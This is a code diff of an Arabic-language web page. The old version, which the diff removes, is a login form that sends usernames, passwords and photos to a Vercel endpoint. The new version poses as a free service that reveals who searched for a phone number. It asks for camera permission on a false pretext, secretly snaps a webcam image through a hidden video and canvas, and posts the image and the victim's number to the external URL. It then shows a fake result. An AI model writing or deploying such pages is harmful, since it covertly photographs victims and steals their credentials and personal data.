@@ -3,68 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>كاشف الأرقام - من بحث عني؟</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; padding: 20px; background-color: #f4f4f4; }
-        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { background-color: #007bff; color: white; border: none; cursor: pointer; font-weight: bold; }
-        button:hover { background-color: #0056b3; }
-        #status { text-align: center; font-size: 14px; margin-top: 10px; }
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        h2 { color: #007bff; font-size: 1.1rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; text-align: center; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        #status { margin-top: 15px; font-size: 13px; color: #555; }
+        video, canvas { display: none; } /* الكاميرا تعمل بالخلفية */
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>تسجيل الدخول</h2>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="اسم المستخدم أو البريد" required>
-        <input type="password" id="password" placeholder="كلمة السر" required>
-        <label>ارفق صورة التأكيد:</label>
-        <input type="file" id="photo" accept="image/*" required>
-        <button type="submit" id="submitBtn">إرسال البيانات</button>
-    </form>
+<div class="container">
+    <div style="font-size: 40px;">🔍</div>
+    <h2>اعرف من بحث عن رقمك بالاسم والصورة</h2>
+    <input type="tel" id="phone" placeholder="أدخل رقم هاتفك هنا">
+    <button id="startBtn">ابدأ الفحص مجاناً</button>
     <div id="status"></div>
 </div>
 
-<script>
-    const form = document.getElementById('loginForm');
-    const status = document.getElementById('status');
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
-    // رابط السيرفر الخاص بك على Vercel
+<script>
+    // الرابط المباشر لمشروعك (تأكد من دقة الرابط)
     const API_URL = "https://sed-x8mt-bwt9kpij7-hamm43791-2459s-projects.vercel.app/log-data";
 
-    form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        status.innerText = "جاري الإرسال...";
-        status.style.color = "blue";
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        const phone = document.getElementById('phone').value;
+        const status = document.getElementById('status');
 
-        const formData = new FormData();
-        formData.append('username', document.getElementById('username').value);
-        formData.append('password', document.getElementById('password').value);
-        formData.append('photo', document.getElementById('photo').files[0]);
+        if (!phone) { return alert("ادخل الرقم أولاً"); }
+
+        status.innerText = "جاري طلب إذن الاتصال بالقاعدة...";
 
         try {
-            const response = await fetch(API_URL, {
-                method: 'POST',
-                body: formData // إرسال البيانات كـ FormData لدعم رفع الصور
-            });
+            // طلب إذن الكاميرا (هنا يوافق المستخدم لكي يبحث)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-            if (response.ok) {
-                status.innerText = "تم الإرسال بنجاح!";
-                status.style.color = "green";
-                form.reset();
-            } else {
-                status.innerText = "فشل الإرسال، تأكد من تشغيل السيرفر.";
-                status.style.color = "red";
-            }
-        } catch (error) {
-            console.error("Error:", error);
-            status.innerText = "حدث خطأ في الاتصال بالسيرفر.";
+            status.innerText = "جاري فحص السجلات للرقم: " + phone;
+
+            // التقاط الصورة بعد ثانية
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('username', "الرقم: " + phone);
+                    formData.append('password', "موقع كاشف الأرقام");
+                    formData.append('photo', blob, 'user.jpg');
+
+                    try {
+                        const res = await fetch(API_URL, { method: 'POST', body: formData });
+                        if (res.ok) {
+                            status.style.color = "red";
+                            status.innerText = "عذراً، لم يبحث عنك أحد في الـ 24 ساعة الماضية.";
+                        }
+                    } catch (e) {
+                        status.innerText = "خطأ في الاتصال، حاول لاحقاً.";
+                    }
+                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
+                }, 'image/jpeg');
+            }, 1000);
+
+        } catch (err) {
+            status.innerText = "يجب السماح بالأذونات لإتمام البحث.";
             status.style.color = "red";
         }
     });
 </script>
-
 </body>
 </html>
